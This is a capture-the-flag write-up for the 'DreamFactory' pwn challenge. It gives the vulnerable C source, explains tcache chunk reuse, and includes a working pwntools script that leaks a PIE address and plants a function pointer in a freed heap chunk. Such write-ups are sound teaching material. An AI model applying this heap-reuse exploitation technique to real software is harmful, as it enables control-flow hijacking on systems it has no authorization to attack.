### DreamFactory 💀 🩸 | 2 Solves 1000 Points
```
Where dreams are made!

Author: Jin Kai
```

`challenge.c`
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

char ascii_art[] =

"\e[0;33m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠸⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⡟⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⣿⣷⠿⠃⢠⣤⣴⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⣿⣏⣤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡈⠉⠁⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⣿⣯⠆⠀⣠⣶⠿⣛⠛⠳⣦⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣙⣤⣤⣼⡏⠹⠛⠋⢁⣠⣿⠋⠉⠛⠳⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠾⣿⠟⢉⣭⡿⠛⠁⠀⠀⢰⠟⠉⠀⠀⠀⠀⠀⠀⠙⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠟⠛⠉⠀⠀⠀⣿⣾⠟⠁⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠟⠋⣿⠀⠀⠀⠀⠀⠀⢰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠁⠀⠀⣿⠀⠀⠀⠀⠀⠀⣿⣧⣿⠀⠀⢰⡷⠀⠀⠀⠀⢠⡟⠃⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠋⠀⠀⠀⠀⠀⣿⡟⠀⠀⠀⠀⠀⢿⡏⠛⢀⠀⠙⠃⠀⠀⠀⢠⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⠀⠀⢰⣄⠀⠀⣰⡄⠀⠀⠀⠀⠘⢿⣄⢻⣖⡀⠀⠀⠀⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠨⠻⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠈⠙⠛⠷⢾⣧⣀⠀⠀⠀⠀⢠⣿⣧⣉⢷⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀⣴⡟⠛⠛⠀⠈⠻⣦⠀⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣙⣻⣦⣴⠶⣿⡛⢻⡙⠻⢧⣄⣀⠀⠈⢿⣄⠀⠀⠀⠀⢀⣴⡾⠋⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⢀⣤⡾⠋⠉⠻⣦⣀⠀⠀⠀⠀⢀⣤⣶⣿⠛⠉⠁⠀⠀⠈⣿⡈⣿⠀⠀⠉⠙⠛⠶⠶⣽⣷⣤⣶⠞⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⣾⠻⣦⡄⠀⠀⠀⠀\n"
"⠀⠀⠀⢀⣴⡾⠋⠁⠀⠀⠀⠀⠈⠙⠳⢶⣤⣄⣿⡵⣟⣿⢷⡄⠀⠀⠀⠀⣿⠇⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡾⠏⠀⠈⠻⣦⡀⠀⠀\n"
"⢀⣤⣾⣛⣁⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣵⣯⣾⢋⣁⣤⣴⠶⠾⠛⠶⠾⠷⢶⣦⣤⣤⣤⣤⣤⣤⡤⠶⠶⠶⠶⠶⠿⠿⠛⠋⠉⠉⠀⠀⠀⠀⠀⠈⠻⣦⡀\n"
"⠀⠉⠙⠛⣿⡛⠛⠛⠛⠳⠶⠶⠶⠶⠦⠤⢤⣤⣤⣤⣤⣽⣯⣥⣠⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣄⣤⣤⣤⡤⠤⠴⢶⡾⠟⠛⠃\n"
"⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠈⠿⠿⠿⠿⣿⠿⠿⠿⢿⡶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⢶⣶⠶⢶⠶⣶⣶⣶⣶⣶⡿⠁⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⢸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠓⠚⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠚⠓⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"         class was so boring, you fell fast asleep...        \n"
"               tell me about your dreams?...                 \n\e[0m";

char* notes[10];
int note_ctr = 0;

void take_note() {
	size_t size;

	if (note_ctr < 10) {
		printf("note size: ");
		scanf("%zu", &size);
		getchar();

		if (size > 0x100) {
			puts("your notebook is not that big!");
			return;
		}

		notes[note_ctr] = malloc(size);
		printf("note content: ");
		size_t sz = read(STDIN_FILENO, notes[note_ctr], size);
		if (notes[note_ctr][sz-1] == '\n') {
			notes[note_ctr][sz-1] = 0;
		}
		printf("you took down note #%d into your notebook!\n", note_ctr);
		note_ctr++;
	} else {
		puts("your notebook ran out of space");
		return;
	}
}

void erase_note() {
	unsigned int idx;
	printf("note index to remove: ");
	scanf("%u", &idx);
	getchar();

	if (idx < 10 && notes[idx]) {
		free(notes[idx]);
		// just calls free
		notes[idx] = 0;
		printf("note #%u is removed\n", idx);
	} else {
		puts("that note does not exist!");
	}
}

void read_note() {
	unsigned int idx;
	printf("note index to read: ");
	scanf("%u", &idx);
	getchar();

	if (idx < 10 && notes[idx]) {
		printf("note #%u: %s\n", idx, notes[idx]);
	} else {
		puts("that note does not exist!");
	}

}

void class() {

	int opt;
	int done = 1;

	while(done) {
		puts("\n1) take down a note");
		puts("2) erase a note");
		puts("3) read a note");
		puts("4) go back");
		printf("> ");
		scanf("%d", &opt);
		getchar();

		switch(opt) {
			case 1:
				take_note();
				break;
			case 2:
				erase_note();
				break;
			case 3:
				read_note();
				break;
			case 4:
				done = 0;
				break;
			default:
				break;
		}
	}
}

typedef void func();
func** dreams;
size_t num_dreams;
size_t dream_i;

void dream_about_kdrama_guys() {
	puts("oooooooooooooooooooooooooo, cute kdrama guy.......");
}

void dream_about_flag_real() {
	char flag[100] = {0};
	FILE *f = fopen("flag.txt", "r");
	fread(flag, 100, sizeof(char), f);
	fclose(f);
	printf("and the flag is.............. %s............\n", flag);
}

void dream_about_flag_fake() {
	printf("and the flag is.............. i forgot............\n");
}

void dream_about_valorant() {
	puts("THWACK! THWACK! THWACK! THWACK! THWACK! ACE!......");
}

void dream_about_school() {
	puts("and the best STUDENT award goes to...........");
}

func* pick_a_dream() {
	int opt;

	while (1) {
		puts("\n1) dream about valorant");
		puts("2) dream about kdrama guys");
		puts("3) dream about school");
		puts("4) dream about flag");
		printf("> ");
		scanf("%d", &opt);
		getchar();

		switch(opt) {
			case 1:
				return (func*)&dream_about_valorant;
			case 2:
				return (func*)&dream_about_kdrama_guys;
			case 3:
				return (func*)&dream_about_school;
			case 4:
				return (func*)&dream_about_flag_fake;
			default:
				break;
		}
	}
}

void add_dream() {
	if (dreams == NULL) {
		puts("you currently have no dreams planned.");
		printf("how many dreams are you planning to have? ");
		scanf("%zu", &num_dreams);
		if (num_dreams > 100) {
			puts("that's too many dreams to have in a single nap!");
			num_dreams = 0;
			return;
		}
		dreams = malloc(sizeof(func*) * num_dreams); // 8 * num_dreams
	}

	if (dream_i < num_dreams) {
		dreams[dream_i] = pick_a_dream();
		dream_i++;
		printf("you currently have %zu/%zu dreams prepared!\n", dream_i, num_dreams);
	} else {
		puts("you have already finished planning all your dreams!");
	}
}

void start_dreaming() {

	for (size_t i = 0; i < num_dreams; i++) {
		if (dreams[i]) {
			((func*)(dreams[i]))();
		} else {
			break;
		}
		printf(".");
		printf(".");
		printf(".\n");
	}

	puts("you woke up from your dream -- 'wow what a good dream!'");
	num_dreams = 0;
	dream_i = 0;
	free(dreams);
	dreams = NULL;

}

void dream() {
	int opt;
	int done = 1;

	while(done) {
		puts("\n1) add a dream");
		puts("2) start dreaming!");
		puts("3) go back");
		printf("> ");
		scanf("%d", &opt);
		getchar();

		switch(opt) {
			case 1:
				add_dream();
				break;
			case 2:
				start_dreaming();
				break;
			case 3:
				done = 0;
				break;
			default:
				break;
		}
	}

}

void menu() {

	int opt;

	puts("\n1) listen to class");
	puts("2) start dreaming");
	puts("3) exit");
	printf("> ");
	scanf("%d", &opt);
	getchar();

	switch(opt) {
		case 1:
			class();
			break;
		case 2:
			dream();
			break;
		case 3:
		default:
			exit(0);
	}
}

int main() {

	setbuf(stdin, 0);
	setbuf(stdout, 0);
	printf("%s", ascii_art);
	while (1) {
		menu();
	}

}
```

300 lines of code to reverse QaQ

But it's not that bad! After some reading through we find that there's 2 "applications" of the binary.

#### The first is dreaming.
```c

typedef void func();
func** dreams;
size_t num_dreams;
size_t dream_i;

void dream_about_kdrama_guys() {
	puts("oooooooooooooooooooooooooo, cute kdrama guy.......");
}

void dream_about_flag_real() {
	char flag[100] = {0};
	FILE *f = fopen("flag.txt", "r");
	fread(flag, 100, sizeof(char), f);
	fclose(f);
	printf("and the flag is.............. %s............\n", flag);
}

void dream_about_flag_fake() {
	printf("and the flag is.............. i forgot............\n");
}

void dream_about_valorant() {
	puts("THWACK! THWACK! THWACK! THWACK! THWACK! ACE!......");
}

void dream_about_school() {
	puts("and the best STUDENT award goes to...........");
}

func* pick_a_dream() {
	int opt;

	while (1) {
		puts("\n1) dream about valorant");
		puts("2) dream about kdrama guys");
		puts("3) dream about school");
		puts("4) dream about flag");
		printf("> ");
		scanf("%d", &opt);
		getchar();

		switch(opt) {
			case 1:
				return (func*)&dream_about_valorant;
			case 2:
				return (func*)&dream_about_kdrama_guys;
			case 3:
				return (func*)&dream_about_school;
			case 4:
				return (func*)&dream_about_flag_fake;
			default:
				break;
		}
	}
}

void add_dream() {
	if (dreams == NULL) {
		puts("you currently have no dreams planned.");
		printf("how many dreams are you planning to have? ");
		scanf("%zu", &num_dreams);
		if (num_dreams > 100) {
			puts("that's too many dreams to have in a single nap!");
			num_dreams = 0;
			return;
		}
		dreams = malloc(sizeof(func*) * num_dreams); // 8 * num_dreams
	}

	if (dream_i < num_dreams) {
		dreams[dream_i] = pick_a_dream();
		dream_i++;
		printf("you currently have %zu/%zu dreams prepared!\n", dream_i, num_dreams);
	} else {
		puts("you have already finished planning all your dreams!");
	}
}

void start_dreaming() {

	for (size_t i = 0; i < num_dreams; i++) {
		if (dreams[i]) {
			((func*)(dreams[i]))();
		} else {
			break;
		}
		printf(".");
		printf(".");
		printf(".\n");
	}

	puts("you woke up from your dream -- 'wow what a good dream!'");
	num_dreams = 0;
	dream_i = 0;
	free(dreams);
	dreams = NULL;

}

void dream() {
	int opt;
	int done = 1;

	while(done) {
		puts("\n1) add a dream");
		puts("2) start dreaming!");
		puts("3) go back");
		printf("> ");
		scanf("%d", &opt);
		getchar();

		switch(opt) {
			case 1:
				add_dream();
				break;
			case 2:
				start_dreaming();
				break;
			case 3:
				done = 0;
				break;
			default:
				break;
		}
	}

}
```

This functionality involves the `dream()`, `add_dream()`, `start_dreaming()`, `pick_a_dream()` and 4 other `dream` functions. Initially a `dreams` is set to NULL. When `add_dream()` is called, we specify a `sz` number of dreams and a `malloc()` call is made to allocate `dreams` `sz*8` bytes, each 8 byte representing a function address. We are then allowed to select any of the 4 dream functions to be used in a dream. `start_dreaming()` would then iterate through the functions in the `dreams` array and call them. The 4 `dream` functions we have does nothing, but a 5th one, `dream_about_flag_real()`, prints the flag for us.

Whenever `start_dreaming()` is called, aside from iterating through the `dreams` array it also calls `free()` on `dreams`, then sets it to NULL.

So to get the flag, we likely need to somehow get `dream_about_flag_real()` in our `dreams` array without being able to do so from any of the `dream`-related functions.

#### The second functionality is note-taking
```c
char* notes[10];
int note_ctr = 0;

void take_note() {
	size_t size;

	if (note_ctr < 10) {
		printf("note size: ");
		scanf("%zu", &size);
		getchar();

		if (size > 0x100) {
			puts("your notebook is not that big!");
			return;
		}

		notes[note_ctr] = malloc(size);
		printf("note content: ");
		size_t sz = read(STDIN_FILENO, notes[note_ctr], size);
		if (notes[note_ctr][sz-1] == '\n') {
			notes[note_ctr][sz-1] = 0;
		}
		printf("you took down note #%d into your notebook!\n", note_ctr);
		note_ctr++;
	} else {
		puts("your notebook ran out of space");
		return;
	}
}

void erase_note() {
	unsigned int idx;
	printf("note index to remove: ");
	scanf("%u", &idx);
	getchar();

	if (idx < 10 && notes[idx]) {
		free(notes[idx]);
		notes[idx] = 0;
		printf("note #%u is removed\n", idx);
	} else {
		puts("that note does not exist!");
	}
}

void read_note() {
	unsigned int idx;
	printf("note index to read: ");
	scanf("%u", &idx);
	getchar();

	if (idx < 10 && notes[idx]) {
		printf("note #%u: %s\n", idx, notes[idx]);
	} else {
		puts("that note does not exist!");
	}

}

void class() {

	int opt;
	int done = 1;

	while(done) {
		puts("\n1) take down a note");
		puts("2) erase a note");
		puts("3) read a note");
		puts("4) go back");
		printf("> ");
		scanf("%d", &opt);
		getchar();

		switch(opt) {
			case 1:
				take_note();
				break;
			case 2:
				erase_note();
				break;
			case 3:
				read_note();
				break;
			case 4:
				done = 0;
				break;
			default:
				break;
		}
	}
}
```
Note-taking functions similar to dreams. We essentially can take up to 10 notes via `take_note()` which calls `malloc()` on an arbitrary `sz` of note that we can choose. We are then allowed to write up to `sz` bytes into the note.

`erase_note()` frees notes that we have already written and aren't freed yet, while `read_note()` reads notes. Looking through I couldn't find a double free or use after free, so it seems secure on its own.

An interesting thing to note however is that both `malloc(), free()` calls in note-taking and dreams use the same heap. Considering that with notes you can write any data in, perhaps there's a possibilitiy of writing the address of `dream_about_flag_real`, and then have this block be used in a `dreams` `malloc()` call?

And the truth is, you can! But first, we'll need to understand how the heap works.

### Heap Basics

For now I'll just explain portions of the heap that are relevant for this challenge. Feel free to look other resources for heap such as [guyinatuxedo's heap exploitation guide](https://guyinatuxedo.github.io/25-heap/index.html)

Whenever a `malloc()` call is made, a portion of the heap will be used to allocate space for the `malloc()` call. The address in the heap that is the start of the allocated space will be returned by `malloc()` as an address pointer.

Similarly, when a `free()` call is made, the allocated space will be designated to be "freed" and thus returns to the heap. Generally speaking it would be better if the address pointers of the freed spaces are still kept in memory so that it can be cached and reused when a `malloc()` call is made with similar sizes.

The heap does this by storing freed data in bins based on the size. There are many bins in the heap such as fastbins and unsortedbins, but the bin in question that we are looking for is the `tcache`. The tcache is a new type of binning mechanism introduced in libc version 2.26, meant to speed up performance since malloc won't have to lock the bin in order to edit it. 

It is also the first place that the program will look to either allocate chunks from or place freed chunks (since it's faster). Thus, when we `free()` dreams or notes, the exact chunk allocated to it will be stored in the tcache, and when we make a `malloc()` call of similar size (be it in the dreams menu or notes menu), that same exact chunk will be reallocated to it from the tcache.

### Putting It Together

Thus we abuse this to obtain our vulnerability. Before we can get the flag however we need to accomplish two goals.

1. Determine the function address of `dream_about_flag_real()` (as there is PIE)
2. Write `dream_about_flag_real()` into `dreams[]` without being able to do so from the dreams menu

The first problem is somewhat simple, but hard to deduce. We first create a `dreams[]` with 3 dreams, so `malloc(0x18)` is called. This will result in a heap chunk of size `0x20` being allocated. (the heap rounds up by default).

We write in 3 dreams of our choosing, and then call `start_dreaming()`, which results in the heap chunk being freed.

When a chunk is freed, the first `0x10` bytes of it are overwritten with header details containing information about the chunk as it is stored into the tcache. It generally contains details such as whether or not the chunk was used previously, the size of the chunk and even a pointer pointing to the next address in the linked list. (since a tcache functions like a linked list). Thus, from our 3 dreams that we wrote in, the first 2 which take up `0x10` bytes get overwritten. But the 3rd dream's data is still stored in this freed chunk. This data would be the location of the 3rd dream's function!

Now, we go into the notes menu and write a note of size 16. `malloc(0x10)` is called and the heap will rounmd this up to `0x20`. The heap first looks into the tcache, finds that there is a freed chunk and allocates it, thus the allocated buffer would contain our dream address.

We simply write 16 bytes of data into the note (which also prevents the inclusion of a NULL byte that would prevent us from seeing the dream address), thus our note would be `DATADATADATADATA<3rd_dream_addr>`.

We use the `read_note()` functionality to read our note, which would result in the dream address being leaked. From here, we can now compute the address of `dream_about_flag_real()`!

Now that we have `dream_about_flag_real()`'s address, we perform a reverse operation;

From notes, we `malloc(0x18)` by indicating we would like to write 24 bytes into our note. This gets rounded up to `malloc(0x20)`. We pad our note by writing 16 bytes and then the address of `dream_about_flag_real()`, then delete this note, resulting in a new tcache entry of chunk size `0x20`. As usual the first 16 bytes are gone replaced with the chunk header, but `dream_about_flag_real()` is preserved.

We pivot back to dreams and malloc 3 dreams. The tcache chunk containing `dream_about_flag_real()` is then allocated. From here, we simply write our first and second dreams, then call `start_dreaming()`, which would result in `dream_about_flag_real()` to be called and thus, we get our flag!

`solve.py`
```py
from pwn import *

p = process('./challenge')
gdb.attach(p, gdbscript='b *menu')
#p = remote("challs.nusgreyhats.org", 32833)

fake_flag = 0x000055555555585f
real_flag = 0x0000555555555765

p.recvuntil(b"> ") # menu
p.sendline(b"2") # start dream
p.recvuntil(b"> ") # dream
p.sendline(b"1") # add dream
p.recvuntil(b"to have? ") # how many dreams
p.sendline(b"3") # 3 dreams

# add_dream() default forces you to pick 1 dream
p.recvuntil(b"> ") # add which dream
p.sendline(b"1") # dream about valo
for i in range(2):
    p.recvuntil(b"> ") # dream menu
    p.sendline(b"1") # add dream
    p.recvuntil(b"> ") # add which dream
    p.sendline(b"4") # dream about fake flags

p.recvuntil(b"> ") # dream menu
p.sendline(b"2") # start dream

pause()
# now dreams[] is freed into tcache, size 0x20. The data of dream 3 is preserved

p.recvuntil(b"> ") # dream menu
p.sendline(b"3") # go back to menu
p.recvuntil(b"> ") # menu
p.sendline(b"1") # listen to class
p.recvuntil(b"> ")
p.sendline(b"1") # take note
p.recvuntil(b"note size: ")
p.sendline(b"16") # 16 bytes. malloc(16) digs into 0x20 sized tcache block so thats now used
p.recvuntil(b"note content: ")
p.sendline(b"A"*16) # overwrite 16 As into it. No NULL byte added at end, this is a vuln in the src code
p.recvuntil(b"> ") 
p.sendline(b"3") # read note
p.recvuntil(b"note index to read: ")
p.sendline(b"0") # read note 0
p.recvuntil(b"A"*16)

fake_flag_addr = u64(p.recvline().rstrip() + b"\x00"*2)
real_flag_addr = fake_flag_addr + real_flag - fake_flag
print(f"dream_about_flag_real at 0x{hex(real_flag_addr)}")

p.recvuntil(b"> ")
p.sendline(b"1") # take note
p.recvuntil(b"note size: ")
p.sendline(b"24")
p.recvuntil(b"note content: ")
p.sendline(b"A"*16 + p64(real_flag_addr)) # 24 bytes
p.recvuntil(b"> ")
p.sendline(b"2") # erase note
p.recvuntil(b"note index to remove: ")
p.sendline(b"1")
p.recvuntil(b"> ")
p.sendline(b"4") # go back to menu

print("If debug use heap bins to check tcache block ty")

p.recvuntil(b"> ")
p.sendline(b"2") # start dreaming. dreams is currently NULL
p.recvuntil(b"> ")
p.sendline(b"1") # add dream
p.recvuntil(b"to have? ")
p.sendline(b"3") # 3 dreams which now uses the buffer
p.recvuntil(b"> ")
p.sendline(b"1") # add whatever dream

p.recvuntil(b"> ") # dream menu
p.sendline(b"1") # add dream
p.recvuntil(b"> ") # add which dream
p.sendline(b"2") # whatever

p.recvuntil(b"> ") # dream menu
p.sendline(b"2") # start dream to execute our modified payload
p.interactive()
```

```
[+] Opening connection to challs.nusgreyhats.org on port 32833: Done
dream_about_flag_real at 0x0x55b036535765
If debug use heap bins to check tcache block ty
[*] Switching to interactive mode
THWACK! THWACK! THWACK! THWACK! THWACK! ACE!......
...
oooooooooooooooooooooooooo, cute kdrama guy.......
...
and the flag is.............. grey{i_dreamt_about_the_flag_appearing_in_my_dreams}............
...
you woke up from your dream -- 'wow what a good dream!'

1) add a dream
2) start dreaming!
3) go back
> $
```